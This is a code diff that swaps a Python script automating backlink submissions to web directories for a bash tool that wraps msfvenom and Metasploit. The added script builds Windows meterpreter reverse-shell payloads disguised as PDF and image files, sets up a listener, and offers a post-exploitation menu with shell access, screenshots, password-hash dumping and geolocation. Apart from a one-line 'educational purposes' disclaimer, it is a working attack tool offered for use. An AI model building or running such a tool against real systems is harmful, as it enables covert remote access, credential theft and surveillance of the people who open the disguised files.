@@ -1,154 +1,202 @@
-import os
-import time
-from selenium import webdriver
-from selenium.webdriver.firefox.service import Service
-from selenium.webdriver.firefox.options import Options
-from selenium.webdriver.common.by import By
-import openpyxl
+#!/bin/bash
 
-# ASCII Art for the menu
-def print_ascii_menu():
-    os.system('clear')
-    print(r"""
-     _______  _______  _______  _______  _______  ______  
-    (  ____ \(  ____ \(  ___  )(       )(  ____ \(  __  \ 
-    | (    \/| (    \/| (   ) || () () || (    \/| (  \  )
-    | (__    | |      | |   | || || || || (__    | |   ) |
-    |  __)   | |      | |   | || |(_)| ||  __)   | |   | |
-    | (      | |      | |   | || |   | || (      | |   ) |
-    | )      | (____/\| (___) || )   ( || (____/\| (__/  )
-    |/       (_______/(_______)|/     \|(_______/(______/ 
-                                                        
-    Author: Saurabh aka (Ace)
-    """)
-    print("[1] Submit Backlinks")
-    print("[2] Exit")
-    print()
+# Exploit Script for PDF and Image Payloads with Post-Exploitation Menu
+# DISCLAIMER: Use this script only for educational purposes on systems you own or have explicit permission to test.
 
-# Initialize Firefox WebDriver
-def initialize_driver():
-    options = Options()
-    options.headless = False  # Set to True to run in headless mode (no browser UI)
-    service = Service("/usr/local/bin/geckodriver")
-    return webdriver.Firefox(service=service, options=options)
+function generate_payload_pdf {
+    echo "============================"
+    echo "   PDF Payload Generator"
+    echo "============================"
+    read -p "Enter your IP address (LHOST): " LHOST
+    read -p "Enter the port to listen on (LPORT): " LPORT
+    echo "[*] Generating malicious PDF payload..."
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f pdf > exploit.pdf
 
-# Submit backlinks from the list
-def submit_backlinks(driver, backlinks):
-    submitted_urls = []
-    for url in backlinks:
-        try:
-            print(f"Submitting to: {url}")
-            driver.get(url)
-            time.sleep(3)  # Adjust wait time if necessary
-            
-            # Example interaction: locate and fill forms (modify selectors as needed)
-            if "submit.php" in url or "submit" in url.lower():
-                driver.find_element(By.NAME, "url").send_keys("https://example.com")
-                driver.find_element(By.NAME, "title").send_keys("Example Website")
-                driver.find_element(By.NAME, "description").send_keys("This is an example description.")
-                driver.find_element(By.NAME, "submit").click()
-                print(f"Submitted: {url}")
-                submitted_urls.append(url)
-        except Exception as e:
-            print(f"Failed to submit: {url} | Error: {e}")
-    return submitted_urls
+    if [[ -f "exploit.pdf" ]]; then
+        echo "[*] Malicious PDF created: exploit.pdf"
+    else
+        echo "[!] Failed to generate PDF. Check msfvenom installation."
+    fi
+}
 
-# Save submitted URLs to an Excel file
-def save_to_excel(submitted_urls):
-    workbook = openpyxl.Workbook()
-    sheet = workbook.active
-    sheet.title = "Submitted URLs"
-    sheet.append(["Submitted Backlinks"])
+function inject_payload_into_custom_pdf {
+    echo "============================"
+    echo "   Custom PDF Injector"
+    echo "============================"
+    read -p "Enter the path to your custom PDF: " custom_pdf
+    if [[ ! -f "$custom_pdf" ]]; then
+        echo "[!] File not found. Please provide a valid PDF file path."
+        return
+    fi
+    read -p "Enter your IP address (LHOST): " LHOST
+    read -p "Enter the port to listen on (LPORT): " LPORT
+    echo "[*] Injecting payload into $custom_pdf..."
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f pdf -o injected.pdf -x "$custom_pdf"
 
-    for url in submitted_urls:
-        sheet.append([url])
+    if [[ -f "injected.pdf" ]]; then
+        echo "[*] Payload successfully injected: injected.pdf"
+    else
+        echo "[!] Failed to inject payload. Check msfvenom installation."
+    fi
+}
 
-    file_name = "submitted_backlinks.xlsx"
-    workbook.save(file_name)
-    print(f"\nSubmitted backlinks saved to {file_name}")
+function generate_payload_image {
+    echo "============================"
+    echo "   Image Payload Generator"
+    echo "============================"
+    read -p "Enter your IP address (LHOST): " LHOST
+    read -p "Enter the port to listen on (LPORT): " LPORT
+    echo "[*] Generating malicious image payload..."
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o image_payload.exe
+    echo "[*] Embedding payload into an image..."
+    read -p "Enter the path to a base image (JPEG/PNG): " base_image
+    if [[ ! -f "$base_image" ]]; then
+        echo "[!] File not found. Please provide a valid image path."
+        return
+    fi
+    cat "$base_image" image_payload.exe > malicious_image.jpg
+    if [[ -f "malicious_image.jpg" ]]; then
+        echo "[*] Malicious image created: malicious_image.jpg"
+    else
+        echo "[!] Failed to create malicious image."
+    fi
+}
 
-# Main menu
-def main():
-    print_ascii_menu()
-    choice = input("Enter your choice: ").strip()
+function inject_payload_into_custom_image {
+    echo "============================"
+    echo "   Custom Image Injector"
+    echo "============================"
+    read -p "Enter the path to your custom image (JPEG/PNG): " custom_image
+    if [[ ! -f "$custom_image" ]]; then
+        echo "[!] File not found. Please provide a valid image path."
+        return
+    fi
+    read -p "Enter your IP address (LHOST): " LHOST
+    read -p "Enter the port to listen on (LPORT): " LPORT
+    echo "[*] Generating payload..."
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o custom_image_payload.exe
+    echo "[*] Injecting payload into $custom_image..."
+    cat "$custom_image" custom_image_payload.exe > injected_image.jpg
+    if [[ -f "injected_image.jpg" ]]; then
+        echo "[*] Payload successfully injected into custom image: injected_image.jpg"
+    else
+        echo "[!] Failed to inject payload into image."
+    fi
+}
 
-    if choice == "1":
-        # List of backlinks (Updated)
-        backlinks = [
-            "https://www.highrankdirectory.com/submit.php",
-            "https://www.sitepromotiondirectory.com/",
-            "https://www.promotebusinessdirectory.com/",
-            "https://gainweb.org/submit.php?",
-            "https://www.poec.info/",
-            "https://poec.info/",
-            "https://www.inyectronicawc.com/",
-            "https://www.welcomelinks.info/",
-            "https://zendirectory.com.ar/",
-            "https://www.marketinginternetdirectory.com/",
-            "http://www.drtest.net/",
-            "https://www.pr8directory.com/",
-            "https://FiveStarsAutoPawn.com",
-            "https://premium.uklinks.info/",
-            "https://seo.optimisationdirectory.info/",
-            "https://newfreedirectory.com.ar.neobacklinks.net/",
-            "https://www.submityourlink.com.ar/",
-            "https://www.alexa.com.ar/",
-            "https://ukdirectory.com.ar/",
-            "https://www.cawausa.neobacklinks.net/",
-            "https://bangalore.directorycritic.info/",
-            "https://redirectplus.info/",
-            "https://newfreedirectory.com.ar/",
-            "https://www.moonsunfavor.com/",
-            "http://www.online-websites-directory.com/",
-            "https://cawausa.neobacklinks.net/",
-            "https://www.optimisationdirectory.info/",
-            "https://www.inyectronicawc.com/",
-            "https://www.projectcollabmanila.neobacklinks.net/",
-            "https://zendirectory.neobacklinks.net/",
-            "https://www.exactseek.com/",
-            "http://www.targetsviews.com/",
-            "http://www.drtest.net/",
-            "http://www.idahoindex.com/",
-            "http://www.fat64.net/",
-            "https://www.canadawebdir.com/",
-            "https://24directory.com.ar/",
-            "https://gcast.info/",
-            "https://www.blpdirectory.info/",
-            "https://www.blackgreendirectory.com/",
-            "https://coastradar.info/",
-            "https://redlavadirectory.com.ar/",
-            "https://thedirectory.com.ar/",
-            "http://picktu.com",
-            "http://www.livepopular.com",
-            "http://www.allfreethings.com",
-            "http://www.freeprwebdirectory.com",
-            "http://www.britainbusinessdirectory.com",
-            "http://www.info-listings.com",
-            "https://bidsyndicate.neobacklinks.net/",
-            "https://www.besttopdir.neobacklinks.net/",
-            "https://submissionwebdirectory.com/",
-            "https://dizila.com/",
-            "https://siteswebdirectory.com/",
-        ]
+function setup_listener {
+    echo "============================"
+    echo "   Metasploit Listener Setup"
+    echo "============================"
+    read -p "Enter your IP address (LHOST): " LHOST
+    read -p "Enter the port to listen on (LPORT): " LPORT
 
-        print("\nInitializing Firefox WebDriver...")
-        driver = initialize_driver()
+    echo "[*] Setting up Metasploit listener..."
+    cat <<EOF > listener.rc
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST $LHOST
+set LPORT $LPORT
+exploit -j
+EOF
 
-        print("\nSubmitting backlinks...")
-        submitted_urls = submit_backlinks(driver, backlinks)
+    msfconsole -r listener.rc &
+    sleep 10
+    post_exploitation_menu
+}
 
-        print("\nClosing browser...")
-        driver.quit()
+function post_exploitation_menu {
+    echo "============================"
+    echo "   Post-Exploitation Menu"
+    echo "============================"
+    echo "1. Get System Info"
+    echo "2. Get User Info"
+    echo "3. Open a Shell"
+    echo "4. Capture a Screenshot"
+    echo "5. Dump Password Hashes"
+    echo "6. Get Location (Geolocation)"
+    echo "7. Exit Session"
+    echo "============================"
 
-        if submitted_urls:
-            save_to_excel(submitted_urls)
-        else:
-            print("\nNo backlinks were successfully submitted.")
-    elif choice == "2":
-        print("\nExiting... Goodbye!")
-    else:
-        print("\nInvalid choice. Please try again.")
-        main()
+    while true; do
+        read -p "Choose an option: " choice
+        case $choice in
+        1)
+            echo "Running: sysinfo"
+            echo "sysinfo" | msfconsole
+            ;;
+        2)
+            echo "Running: getuid"
+            echo "getuid" | msfconsole
+            ;;
+        3)
+            echo "Running: shell"
+            echo "shell" | msfconsole
+            ;;
+        4)
+            echo "Running: screenshot"
+            echo "screenshot" | msfconsole
+            ;;
+        5)
+            echo "Running: hashdump"
+            echo "hashdump" | msfconsole
+            ;;
+        6)
+            echo "Running: geolocate"
+            echo "geolocate" | msfconsole
+            ;;
+        7)
+            echo "Exiting the session."
+            echo "exit" | msfconsole
+            break
+            ;;
+        *)
+            echo "Invalid choice. Please try again."
+            ;;
+        esac
+    done
+}
 
-if __name__ == "__main__":
-    main()
+function main_menu {
+    while true; do
+        echo "============================"
+        echo "       Main Menu"
+        echo "============================"
+        echo "1. Generate Malicious PDF"
+        echo "2. Inject Payload into Custom PDF"
+        echo "3. Generate Malicious Image"
+        echo "4. Inject Payload into Custom Image"
+        echo "5. Start Listener with Post-Exploitation Options"
+        echo "6. Exit"
+        echo "============================"
+        read -p "Choose an option: " choice
+
+        case $choice in
+        1)
+            generate_payload_pdf
+            ;;
+        2)
+            inject_payload_into_custom_pdf
+            ;;
+        3)
+            generate_payload_image
+            ;;
+        4)
+            inject_payload_into_custom_image
+            ;;
+        5)
+            setup_listener
+            ;;
+        6)
+            echo "Exiting. Stay ethical!"
+            exit 0
+            ;;
+        *)
+            echo "Invalid choice. Please try again."
+            ;;
+        esac
+    done
+}
+
+# Run the main menu
+main_menu
